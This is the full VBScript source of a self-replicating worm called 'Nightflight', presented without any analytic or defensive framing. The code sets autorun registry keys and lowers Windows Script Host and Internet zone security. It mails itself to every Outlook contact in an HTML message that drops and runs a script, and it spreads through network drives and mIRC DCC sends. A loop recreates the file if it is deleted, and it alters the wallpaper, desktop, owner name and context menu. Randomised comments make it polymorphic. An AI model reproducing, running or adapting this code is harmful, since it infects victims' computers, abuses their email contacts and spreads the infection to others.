
''Nightflight
On Error Resume Next
'PBlQiwNrLv

Set fso = CreateObject("Scripting.FileSystemObject")
'QNG
FName=""

'XqPkqmzDUlnxJDd
Call Startup()

'QgCvkTbRJRsIHeilcEVNvbdBafuH
If RegGet("HKCU\software\Nightflight\send") <> "1" then
 Call Polymorph()
'mPnNLkWjBleyvVnPG
 Call InternetZone()
 Call OutlookWarning()
'ObrQ
 Call OutlookBody()
 Call DoDrives()
'NhbI
 Call TrustPolicy()
 Call RemoteScript()
'oLROrCCB
 Call Network()
 Call Wallpaper()
'hpXfew
 Call RightMenu()
 Call HideDesktop()
'aXsKCjVYoVjfSbEEc
 Call ChangeUserName()
 Call MerlinAction()
'zuyTpTYntbntpDWgmnyYTtv
End If

'hDMAdcRZbtXWiaXsZC
Call Antidelete(fname)

'fYpejucbTTrCPoLnOcpcZnkJrDKGSf
Function Startup()
On Error Resume Next
'FGRkWwOsiENBedSLTuYIb

 Randomize
'tDkgZqfkwdcUFd

 Do until Len(FName) = 7 
'QaMi
  FName = FName + Chr(Int((90 - 80 + 1) * Rnd + 80))
 Loop
'QDAtOKdCeamqHalvqXiEpjHR

 If FName <> "" Then 
'PVEwFgufxCF
   RegSet "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" &Left(FName,1) &LCase(Right(FName,6)), "wscript.exe " &fso.GetSpecialFolder(0) &"\help.txt.vbs %", "0"
 End If
'XiaOtwUtyOZqGrcHaEjDmrUrExSO
End Function

'GbZUbuLdVAuIenbLVVTZsB
Sub TrustPolicy()
On Error Resume Next
'kyxQUXO
 RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\TrustPolicy", 0, "1"
End Sub
'BsaMPgMRaJYuuZcqWmVpKgK

Sub InternetZone()
'QeRkYeldqJceoP
On Error Resume Next
 RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "1"
'jlWsCpZ
 RegSet "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "1"
End Sub
'VTYIPJyyQFIy

Sub RemoteScript()
'BdbNAXMCRKJuuZdq
On Error Resume Next
 RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\Enabled", 1, "1"
'mVpKXKIBVSlZfl
 RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\Remote", 1, "1"
End Sub
'uNOgisTyqcxHuYZXMFNoS

Sub OutlookWarning()
'UYSC
On Error Resume Next
 RegSet "HKCR\VBSFile\Editflags", 01000100, "1" 
'TOBYNDSLKvgLerInHrvY
End Sub

'JCWTmLgm
Sub OutlookBody()
Set Outlook = CreateObject("Outlook.Application")
'vyPhitFyqMcxrfPZZYNFNo

 If Outlook = "Outlook" Then
'CFJMD
  Set Myself = fso.opentextfile(wscript.scriptfullname, 1)
  I = 1
'phWCFBGWbyOhYwVUtr
  
  Do While Myself.atendofstream = False
'gKhtmHEvXOKXjBYLVpj
   MyLine = Myself.readline
   Code = Code & Chr(34) & " & vbcrlf & " & Chr(34) & Replace(MyLine, Chr(34), Chr(34) & "&chr(34)&" & Chr(34))
'TwTZaUxIIGM
  Loop
  
'nvlkDHKyQIpuaplYhKKir
  Myself.Close
   
'qNpReIerkFm
  htm = "<" & "HTML><" & "HEAD><" & "META content=" & Chr(34) & "&chr(34)&" & Chr(34) & "text/html; charset=iso-8859-1" & Chr(34) & " http-equiv=Content-Type><" & "META content=" & Chr(34) & "MSHTML 5.00.2314.1000" & Chr(34) & " name=GENERATOR><" & "META content=" & Chr(34) & "Author" & Chr(34) & " name=Nightflight><" & "STYLE></" & "STYLE></" & "HEAD><" & "BODY bgColor=#ffffff><" & "SCRIPT language=vbscript>"
  htm = htm & vbCrLf & "On Error Resume Next"
'tGMIVhxHI
  htm = htm & vbCrLf & "Set fso = CreateObject(" & Chr(34) & "scripting.filesystemobject" & Chr(34) & ")"
  htm = htm & vbCrLf & "If Err.Number <> 0 Then"
'nhOQuCXaUxss
  htm = htm & vbCrLf & "document.write " & Chr(34) & "<font face='verdana' color=#ff0000 size='2'>You need ActiveX enabled if you want to see this e-mail.<br>Please open this message again and click accept ActiveX<br>Microsoft Outlook</font>" & Chr(34) & ""
  htm = htm & vbCrLf & "Else"
'ZIQYkONUXOjQspPgRalZYKKirG
  htm = htm & vbCrLf & "Set vbs = fso.createtextfile(fso.getspecialfolder(0) & " & Chr(34) & "\help.txt.vbs" & Chr(34) & ", True)"
  htm = htm & vbCrLf & "vbs.write  " & Chr(34) & Code & Chr(34)
'ybCWdWUNbxfrxtHZstF
  htm = htm & vbCrLf & "vbs.Close"
  htm = htm & vbCrLf & "Set ws = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
'KkCgnJSGjeediYQYAN
  htm = htm & vbCrLf & "ws.run fso.getspecialfolder(0) & " & Chr(34) & "\wscript.exe " & Chr(34) & " & fso.getspecialfolder(0) & " & Chr(34) & "\help.txt.vbs %" & Chr(34) & ""
  htm2 = htm2 & vbCrLf & "document.write " & Chr(34) & "This message has permanent errors.<br>Sorry<br>" & Chr(34) & ""
'dgyeSNBXNDSKKvgLdr
  htm2 = htm2 & vbCrLf & "End If"
  htm2 = htm2 & vbCrLf & "<" & "/SCRIPT></" & "body></" & "html>"
'nHqvYLI
  HtmlBody = htm & htm2   
   
'WSlK
  Set b=fso.CreateTextFile(fso.getspecialfolder(0) + "\warning.htm")
  b.close
'mhuyPgisExqLcxqfPYZXM

  Set HtmlFile = fso.OpenTextFile(fso.GetSpecialFolder(0) &"\warning.htm",2,True,0)
'MoDCU
   Htmlfile.Write htm
   Htmlfile.Write vbcrlf
'SnFxgSVlRXgrPQ
   Htmlfile.Write htm2
  Htmlfile.Close
'xwH

  Set Mapi = Outlook.GetNameSpace("MAPI")
'LPmQVjgGzqmzSdBn
  Set MapiAdList = Mapi.AddressLists

'uoVXCYhFPPOTnuD
  For Each Address In MapiAdList
   If Address.AddressEntries.Count <> 0 Then
'ssKORIeumHJaGLXETopT
    NumOfContacts = Address.AddressEntries.Count
   
'kQgPjECOHJcQclEVj
    For ContactNumber = 1 To NumOfContacts
     Set EmailItem = Outlook.CreateItem(0)
'EegRYnwl
     Set ContactNumber = Address.AddressEntries(ContactNumber)
	
'PQOTDKSeJtLAD
     nls = RegGet("HKCU\software\Nightflight\number")
 
'VvIuSHwMYFEpqUmRhQlFSFDvQNg
     If (nls = "") then
      nls = 1
'agcpIJbcnOsZ
     End if

'VrBlUPQOTDuDfJsLPSJeLmW
     If (Int(NumOfContacts) > Int(nls)) then
      EmailItem.To = ContactNumber.Address
'aIxNYFFq
      EmailItem.Subject = "Hi :-)"
      EmailItem.Body = HTMLBody
'GmDhBlpTGDvQNgFajmE
      EmailItem.DeleteAfterSubmit = True 

'hsmTfAWlfZDNOMRB
      If EmailItem.To <> "" Then
       EmailItem.Send
'BcrqIMPGcskZFIEJZeCRDnSkjPt
        RegSet "HKCU\software\Nightflight\send", "1", "0"
      End If
'bFcohCyYqSJFSevTGQkeLOrO
     End If   
    Next
'fDNOMRlsBcrqJNQG
   End If
  Next
'tkZFIEKZVCRnnSjPeNi
 
 Outlook.Quit
'DPIK
 End If
End Sub
'qDJFSeu

Sub Mirc(Path)     
'FQkeF
On Error Resume Next
 If Path <> "" Then
'lsOXLo
  Set Script = fso.CreateTextFile(Path & "\script.ini", True)

'jhnemFcbtilcEeNkWJaVLg
  Script.writeline "[script]"
  Script.writeline "n0=on 1:JOIN:#:{"
'SEEcmAvyTaTQ
  Script.writeline "n1= /if ( $nick == $me ) { halt }"
  Script.writeline "n2= /." & chr(100) & chr(99) & chr(99) & " send $nick " &fso.GetSpecialFolder(0) &"\warning.htm"
'dDkvDyLx
  Script.writeline "n3=}"
  Script.writeline "n4=on 1:OP:#:.timer1 1200 /kick $me you worked for too long - fly the night!!!"
'KePpHlsOXLojjhnVFcSeORIeKmWJaP
  Script.writeline "n5=on 1:Join:#:if $chan = #help /part $chan"
  Script.writeline "n7=on 1:Text:#:*idiot*:/say $chan Yes I am a fucking idiot !!!"
'UaNNy
  Script.writeline "n8=on 1:Text:leave!!!:#:{ /msg $chan Your will is my command"
  Script.writeline "n9=                       /part $chan }"
'NguKpJtxOLEYVoNiokxBRj
  Script.Close
 End If
'hrmTezWlfZDNNMRB
End Sub

'BcqpIMPGbsgVBEAFVajxjyYWvbu
Sub Antidelete(rname)
On Error Resume Next
'jMjwpKHayRNZmDNYsmTV

 Dim Myself
'UdXBLMKPjqyapoGKNEaqiXDGCHXTz
 Set Myself = fso.OpenTextFile(WScript.ScriptFullName, 1)

'llQZhMcLgA
 MyCode = Myself.readall
 Myself.Close
'BNGIbPbkDUiJDdfQX

 Do
'YMpkkiofnG
  If Not (fso.FileExists(WScript.ScriptFullName)) Then
   Set Myself= fso.CreateTextFile(WScript.ScriptFullName, True)
'cujmdFfOMreCqgvHonEO
   Myself.write MyCode
   Myself.Close
'BXzoColqLIbPbkEF
  End If

'iJnVgQXmvkTOPNSC
  If Not RegGet("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" &rname) = "wscript.exe " &fso.GetSpecialFolder(0) &"\help.txt.vbs %" then
   RegSet "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" &Left(rname,1) &LCase(Right(rname,6)),"wscript.exe " &fso.GetSpecialFolder(0) &"\help.txt.vbs %", "0"
'CeIrKORIdKlVJVLfSSEoTlzQuOy
  End if
 Loop
'aTQJt
End Sub

'QWScsRShcJpMbPsDDCHqiqYgf
Sub RegSet(key,value,keytype)
On Error Resume Next
'zDsVfMruRqvMXoEpaFCgAkoSpCuP
 Dim re
 Set re = CreateObject("WScript.Shell")
'IaCsoCUeDozUuwbxENBeop
 
 Select Case keytype   
'FgoWedvzDtVgMruSrwMIoEaaFOCYBp
  Case "1" re.RegWrite key,value, "REG_DWORD"
  Case Else re.RegWrite key,value
'SXlZsamsoySckmwXSsufCKycb
 End Select  
End Sub
'YasWVhWrYBx

Function RegGet(value)
'XUKZfSRDDblyuxSSPJtb
On Error Resume Next
 Dim re
'plySTkmwXCcufBKybaQIQrWG
 Set re = CreateObject("WScript.Shell")
 RegGet = re.RegRead(value)
'ORIdKmWJ
End Function

'VLgTSEoTmAQvPyEaTQ
Sub network()
On Error Resume Next
'uTnuqDHX
Dim fso, wsn, NetDrives, xc
Set fso = CreateObject("Scripting.FileSystemObject")
'PfGXmJYMpz
Set wsn = CreateObject("WScript.Network")
Set NetDrives = wsn.EnumNetworkDrives
'yEn

 If NetDrives.Count <> 0 Then
'nWeevADtWgNsuSrwMYpF
  For xc = 0 To NetDrives.Count - 1
   If InStr(NetDrives.Item(xc), "\" ) <> 0 Then
'bFChBlpTpDvQNgFaXTasJbTysZ
    fso.CopyFile WScript.ScriptFullName, fso.BuildPath(NetDrives.Item(xc), fso.GetSpecialFolder(0) &"\help.txt.vbs") 
   End If
'GcYNpAByEfnWedvz
  Next
 End If
'tVgM
End Sub

'uSrwNJpFabFPCYBpTPUiWpjplyR
Sub ActivateRemoteScript()
On Error Resume Next
'kmwXRrtfBKybaQXrWVg
 Dim wsn, controller, process
 Set wsn = CreateObject("WScript.Network")
'XsZCzfYpejvcbTUr
 Set controller = CreateObject("WSHController")

'QoLn
 Set Process = controller.CreateScript(fso.GetSpecialFolder(0) &"\help.txt.vbs", CStr(wsn.ComputerName))
 Process.Execute
'cpcaZnkKrE
End Sub

'GTfgFGRl
DoDrives()

'wOszVSvbRJRsX
Function Dodrives()
On Error Resume Next
'YaWsZB

 Set Drives = fso.Drives
'fZpekvccUFdCQLPTqdaZnkK

 For Each Drive In Drives
'EKGTWhFHRWwPdAVPDgq
  If Drive.Drivetype = Remote Then
   fdready = Drive & "\"
'agVOWxMLbewOGntZnzX
   Call Subfolders(fdready)
  ElseIf Drive.IsReady Then
'GqUnmRwQmqUq
   hdready = Drive & "\"
   Call Subfolders(hdready)
'wROhG
  End If
 Next
'YUbtKcUztHdmaKUVTY
End Function

'AIjxxPTWNjAraMOfLQJYtuYcmS

Function Subfolders(path)
'RlGcGSLaNgUahcpJZbdnOI
On Error Resume Next
 
'lVrBaKFFEJsAIyxPEHxAca
 Set Fold = fso.GetFolder(path)
 Set Files = Fold.Files
'yWLBQJJuu

 For Each file In Files
'cqTiSmHUHEwROhV
  If file.Name = "mirc.ini" Then
   Call Mirc(file.ParentFolder)
'idqKLceoPtmWtCHCDBG
  End If
 Next
'hpXvfwBEuXxOJwTIxOZGGrcHn

 Set file = Fold.Subfolders
'iCmqU
  For Each Subfol In file
   Call Subfolders(Subfol.path)
'EwROhG
  Next
End Function
'hdqtLceoztmHsmaKqqo


'eeMXimpgJZRzfhFejyLcrdUrRQon
Sub HideDesktop()
 If day(now) = 5 Then
'FbF
  RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 00000001, "1" 
 End If
'LuTogboIYqc
End Sub

'NIikVlrBoYccagGOWxMLbewO

Sub ChangeUserName()
'AfiFfk
 RegSet "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner", "NightFlight", "0"
 RegSet "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "Carpe Noctem", "0"
'vcrUUsCQpLoPdGdpiEkKrELGTgwFHR
End Sub

'IikVrBoYTUSXHOWiNMSVMiO

Sub RightMenu()
'oNeZPkXXJJhqFeAcEXfYVOcygs
On Error Resume Next
 If RegGet("HKCR\AllFileSystemObjects\shell\" & "Start the NightFlight" & "\command\") = "" then
'rFYZqsDIiBelHQFhcdbgWOWxMcfN
  RegSet "HKCR\AllFileSystemObjects\shell\" & "Start the NightFlight" & "\command\","wscript  " & fso.GetSpecialFolder(0) &"\help.txt.vbs", "0"
 End If
'PraOfQalYYKuYrGVBUFJgZ
End Sub

'MavUpwrFJZqs

Sub Wallpaper()
'OIjBW
Dim ws, fso, f, fc, f1, Counter, Bmps, RndNumber

'IBpZcdbhWPWkzyQUYOkBsbNQ
 Set f = fso.GetFolder(fso.GetSpecialFolder(0))
 Set fc = f.Files
'MRbmKZLvsrXCVGKhLXQeb
 Set Bmps = CreateObject("Scripting.Dictionary")

'Zul
 Randomize
 Counter = 0
'oHXpbmNHhjUkqznXbca

 For Each f1 in fc
'GNVwLLadwNFnZsYmjWfHI
  If Right(f1.name,4) = ".bmp" Then
   Bmps.Add Counter, f1.name
'lzuySpTYmtbntpDWgoq
   Counter = Counter + 1
  End If
'NHhjUqAnXSTRWGNVhMLRULhN
 Next

'kXKaWMgTTFFdmBawAUbURLuc
 If Bmps.count = 0 Then
  Exit Sub
'vqEXYprCydKGNclaJEFDIrjrZ
 End if

'hyEHwZzbQLyVLAQIIteJbpGkEosWJ
RegSet "HKCU\Control Panel\desktop\Wallpaper", fso.GetSpecialFolder(0) & Bmps(Int(Bmps.Count * Rnd)), "0"
End Sub
'LvUpXTaeuSU


'jdLqNcRtEFDIrjrih
Sub MerlinAction()
On Error Resume Next
'EHxZkbQvyVvBQsIteGDiClqTqDwROh
Dim AgentControl
Set AgentControl = CreateObject("Agent.Control.1")
'aYTatK
 
 If day(now) = 7 Then
'UytHdmaKUUSYrzIjxwk
  If IsObject(AgentControl) Then
   AgentControl.Connected = True
'riKTChjHglBxesVVtERqNpqTq
   Dim merlin, merlindir
   merlindir = RegGet("HKLM\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
'wRxXF
   On Error Resume Next
    AgentControl.Characters.Load "merlin", merlindir &"\Microsoft Agent\characters\merlin.acs"
'YTatKSUysGN
    Set merlin= AgentControl.Characters ("merlin")
    merlin.Get "state", "Showing"
'OCfaa
    merlin.Get "state", "Speaking"
    merlin.MoveTo 10, 10
'eUdvZZkcZuEChreZj
    merlin.Show
    merlin.Get "state", "Moving"
'bbTTrBPoKnOcpcYmjJqDJFSfgEGQ
    merlin.MoveTo 257, 177
    merlin.Speak ("The Nightflight is still out there!")
'VvOryUSgbcafVNVwLbewFni
    merlin.Hide
   End If
'pejucbTEcCPLOT
  End If 
End Sub 
'cZnkJbDKGSWgFGRWwOdzVPDgq

Function polymorph()
'agVOVxMLbewOGnZsZny
On Error Resume Next
Set openfile = fso.OpenTextFile(Wscript.ScriptFullName,1)
'fXIgFEdPcSXtXd
file = openfile.ReadAll
openfile.Close
'rnNfHytHkIuFZBDhE

Strings = Split (file, vbCrLf)
'TIkuvtyZ

For x = 0 To UBound (Strings) Step 1
'iRquxoQbYHmpMmQIXt
 If Strings(x) = Chr(39) & Chr(39) & "Nightflight" Then
  Exit For
'YbpVkUoJfJVOdQjXdjfsMegqRLm
 End If
Next
'bwmbLFGEKsBIyxQFIyBdaMzWM

For x = x To UBound (Strings) Step 1
'SKKv
 If Mid (Strings(x), 1, 1) = Chr(39) And Mid (Strings(x), 2,1) <> Chr(39) Then
  x = x
'drXmVqKYLIBVSlZflhuOPgisTxqb
 Else
  Clearfile = Clearfile & Strings(x) & vbCrLf
'TvqrpueeMkmqt

  If Strings(x) = Chr(39) & Chr(39) & "End" Then
'MmUDxlIxnDOuugXvUcsqbfJ
   Exit For
  End If
'tmIEvXZgkBYepjRcwTjcXAKLJPxpx
 End If
Next
'onGKNEqiWCFCHWbyOz

 MutateBody = vbCrLf & Mutator(Clearfile)
'PhgMrbgJgsmHEvWOKWjAYKU
     
 Set Victim = FSO.OpenTextFile(fso.GetSpecialFolder(0) &"\help.txt.vbs",2,True,0)
'jDFiFLUJlvwuAbjSarvypRcZI
 Victim.Write MutateBody
 Victim.CLose
'vaplYhKKirGfBeFZ
End Function

'KXQeSlZelhtNghsTNnpbw
Function Mutator(CTM)
On Error Resume Next
'qZUV

 Strings = Split (CTM, vbCrLf)
'YIPXjONTXNjQ
 CommentsCount = Cbyte (GetRndNumber(3, UBound(Strings) / 1.5))
 CommentPlace = Cbyte (UBound(Strings) / CommentsCount)
'KxUKyPHHssXaoUjSnH
 y = 0

'ebolLsFLHUghGISmXxPtBWTwrs
 For b = 0 To UBound(Strings) Step 1
  DoMutateBody = DoMutateBody & Strings(b) & vbCrLf
'vffNlmqtkNmVEylJxnEIHsdIbo
  y = y + 1
 
'kEnsV
  If y = CommentPlace Then
   Comment = MakeComment
'bolLdFLHUYiGISXyQeBW
   DoMutateBody = DoMutateBody & Comment
   y = 0
'FhrsqvffOnr
  End If
 Next
'lNVEgjGglBMdseVtSRqpeHeqkFB

 Mutator = DoMutateBody
'bDupDWg
End Function

'qBWwy
Function MakeComment
On Error Resume Next
'bkIST

 CommentLenght = Cbyte (GetRndNumber(3, 30))
'WqxGiwvOSVL
 DoComment = Chr(39)
 
'vnHKaHMXETppUlRgQkFb
 For z = 1 To CommentLenght Step 1
  a = CByte(GetRndNumber (65, 122))
'RLMfT
  
  If a < 91 Or a > 96 Then
'gboIYacmNHikVrAaJE
   DoComment = DoComment & Chr(a)
  Else
'DIryH
   z = z - 1
  End If
'tsLzDtVvIuSHw
 Next

'JqpbbGPDZCqEqnhCxXGRYUatuTUye
 MakeComment = DoComment & vbCrLf
End Function
'WBHfE

Function GetRndNumber(a,b)
'ywDldlUrbtxBrTtKFsPFuKVCCnDjz
On Error Resume Next

'yinQDAsOKdCemqHakvpX
 Randomize
 c = (b - a) * Rnd + a
'czVODgpqwD
 GetRndNumber = c
End Function
'emUcbtxBrTeKpsQpuKVmCnDz
''End

'XIMjM
